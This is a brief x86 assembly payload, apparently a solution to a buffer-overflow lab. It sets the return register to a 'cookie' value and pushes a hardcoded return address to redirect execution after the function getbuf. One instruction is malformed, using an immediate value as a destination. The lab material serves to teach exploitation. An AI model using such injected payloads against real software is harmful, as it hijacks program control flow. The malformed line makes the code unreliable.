		
		movl $0x35c5d934, %eax #cookie is return value of getbuf
		movl %esp, %ebp
		movl   $0x8048dca, $4(%ebp)
	        push $0x08048bfa        #push return address
		ret
	